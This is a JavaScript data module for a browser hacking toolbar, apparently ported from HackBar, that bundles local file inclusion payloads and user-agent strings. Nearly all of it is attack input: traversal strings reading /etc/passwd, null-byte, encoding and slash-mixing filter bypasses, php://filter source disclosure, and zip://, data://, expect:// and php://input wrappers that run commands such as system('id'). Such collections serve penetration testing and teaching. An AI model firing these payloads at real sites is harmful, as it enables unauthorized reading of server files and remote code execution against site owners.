/**
 * StiffEyes HackBar Payloads — LFI payloads & UA presets.
 * Ported from HackBar v2.3.1 hackbar-panel.html LFI menus.
 */
var StiffEyesHackbarPayloads = (function () {

  var LFI_PAYLOADS = [
    {
      group: 'Basic',
      items: [
        { label: 'Basic LFI', value: '?page=../../../etc/passwd' },
        { label: 'Null Byte', value: '?page=../../../etc/passwd%00' },
        { label: 'Double Encoding', value: '?page=%252e%252e%252fetc%252fpasswd' },
        { label: 'Double Enc + Null', value: '?page=%252e%252e%252fetc%252fpasswd%00' }
      ]
    },
    {
      group: 'Path Truncation',
      items: [
        { label: 'Dots truncation', value: '?page=../../../etc/passwd............[ADD MORE]' },
        { label: 'Dots + backslash', value: '?page=../../../etc/passwd\\.\\.\\.\\.\\.\\.[ADD MORE]' },
        { label: './ repetition', value: '?page=../../../etc/passwd/./././././.[ADD MORE]' },
        { label: 'Deep traversal', value: '?page=../../../[ADD MORE]../../../../etc/passwd' }
      ]
    },
    {
      group: 'Filter Bypass',
      items: [
        { label: 'Double dot bypass', value: '?page=....//....//etc/passwd' },
        { label: 'Mixed slashes', value: '?page=..///////..////..//////etc/passwd' },
        { label: 'Dot repetition', value: '?page=../../../etc/passwd/./././././.[ADD MORE]' },
        { label: 'Backslash bypass', value: '?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd' }
      ]
    },
    {
      group: 'PHP Wrappers',
      items: [
        { label: 'php://filter (ROT13)', value: '?page=php://filter/read=string.rot13/resource=index.php' },
        { label: 'php://filter (Base64)', value: '?page=php://filter/convert.base64-encode/resource=index.php' },
        { label: 'php://filter (case mix)', value: '?page=pHp://FilTer/convert.base64-encode/resource=index.php' },
        { label: 'zip://', value: '?page=zip://shell.jpg%23payload.php' },
        { label: 'data://', value: '?page=data://text/plain;base64,[base64_encode_shell]' },
        { label: 'expect://id', value: '?page=expect://id' },
        { label: 'expect://ls', value: '?page=expect://ls' },
        { label: 'php://input', value: '?page=php://input | POST DATA: <?php system(\'id\'); ?>' }
      ]
    }
  ];

  var UA_PRESETS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'curl/7.68.0',
    'Googlebot/2.1 (+http://www.google.com/bot.html)'
  ];

  return {
    LFI_PAYLOADS: LFI_PAYLOADS,
    UA_PRESETS: UA_PRESETS
  };
})();
